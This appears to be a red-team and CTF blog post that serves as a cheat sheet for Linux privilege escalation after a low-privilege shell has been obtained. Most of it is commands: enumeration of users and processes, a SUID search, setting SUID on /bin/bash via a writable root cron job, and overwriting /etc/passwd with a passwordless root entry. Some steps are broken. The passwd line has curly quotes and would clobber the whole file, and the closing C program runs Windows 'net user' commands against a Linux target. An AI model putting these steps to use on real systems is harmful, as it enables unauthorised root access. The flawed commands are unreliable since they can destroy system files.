---
layout: post
title:  "Linux Privilage Escalation"
date:   2020-02-15 08:12:24 +0530
categories: redteam ctf
---

This post talks about what to do after getting the initial low privilage shell and how to escalate the privilage upto root.

## Get the system info
```
uname -a
```
If the host is older than 2016 there is a high probability of the host is being vulnerable to dirtycow attack.
[here you can find the dirtycow info](https://dirtycow.ninja/)
Before running this exploit check c compiler is installed in the host
```
which gcc
```

## Run this shell script to get more info
```
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```

## Find OS version
```
cat /etc/*-release
uname -i
lsb_release -a
```
## Logged in user
```
id
whoami
pwd
```
## Other users
```
cat /etc/passwd
grep -vE "nologin|false" /etc/passwd
```
## curently running processes
```
ps aux
netstat -antup
```
## What's installed
```
dpkg -l (Debian based OSs)
rpm -qa (CentOS / openSUSE )
uname -a
```

## In privilage escalation we need to find answers first to below questions
```
What user files do we have access to?
What configurations do we have access to?
Any incorrect file permissions?
What programs are custom? Any SUID? SGID?
What's scheduled to run?
Any hardcoded credentials? Where are credentials kept?
```

## use a script to find the answers
```
https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
```

## User editable cronjobs
```
crontab -l
```

## Application based cron jobs
```
ls -all /etc/cron.d
```
## if you find a cronjob running as root but can be editable run this command
```
chmod u+s /bin/bash
and then this,
/bin/bash -p
```

## Writable /etc/passwd file found
```
“root::0:0:root:/root:/bin/bash” > /etc/passwd
```

## SUID checker
```
find / \( -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
```

## If it is possible to run a c executable, run useradd.c file
```
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user janith janith@123 /add && net localgroup administrators janith /add");
  return 0;
}
```
